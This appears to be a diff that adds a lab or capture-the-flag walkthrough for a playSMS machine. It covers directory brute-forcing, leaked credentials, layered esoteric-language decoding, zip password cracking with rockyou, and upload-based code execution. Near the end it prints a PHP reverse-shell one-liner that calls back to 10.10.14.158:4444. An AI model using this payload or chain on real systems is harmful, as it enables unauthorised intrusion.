@@ -1,0 +1,72 @@
+10.10.10.111:9999/admin
+
+gobuster find : backup
+/backup/password.txt : imnothuman
+/backup/user.txt : admin
+
+/js/login.js
+var username = document.getElementById("username").value;
+var password = document.getElementById("password").value;
+if ( username == "admin" && password == "superduperlooperpassword_lol"){
+alert ("Login successfully");
+troll ? 
+..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
+..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
+....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
+..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
+!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
+..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
+?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
+..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
+..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
+!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
+!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
+.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
+!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
+?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
+!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
+!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
+!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
+..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
+!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
+!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
+..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
+..!.! !!!!! !.?.
+is it Ook! language ??
+
+Ook! decoded :
+Nothing here check /asdiSIAJJ0QWE9JAS
+
+sur : http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ methode post
+UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA
+
+base64 -d
+on obtiens un zip
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded
+PASSWORD FOUND!!!!: pw == password
+
+HEXA
+4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+
+base64
+���~����~����~����~����M����~����~����~����~��N:�N��N��~����~���ߎ���w�N���w�N����~����~����~��Κ��������~����M����~����θ�N��~��~��N7�~�����xߎ���w�N��N:�N��N��N���w�N���w�N���w�N���w�N���w�N��Κ�����~�������~��N��~����~��N:�N��N��~���ߎ��N7�~����~���xߎ���w�NN:�M���w�N��Κ�����~����M����~����θ�N��~��ν�N������wߎ��N7�~����~���xߎ���w�N��N:�M���w�N���w�N���wߎ��N7�~����~����M����~����}���xߎ��~��Κﾻ�~�������#
+
+Brainfuck
++++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
+++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
+<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
+
+resultat :
+idkwhatispass
+
+http://10.10.10.111:9999/dev/backup/
+
+http://10.10.10.111:9999/playsms/
+user: admin
+password: idkwhatispass
+
+my account/sendfrom file
+envoyer le fichier crée a cet effet et changer l'user agent pour la code execution !
+php -r '$sock=fsockopen("10.10.14.158",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+buffer overflow faire pop le shell et on est root :)
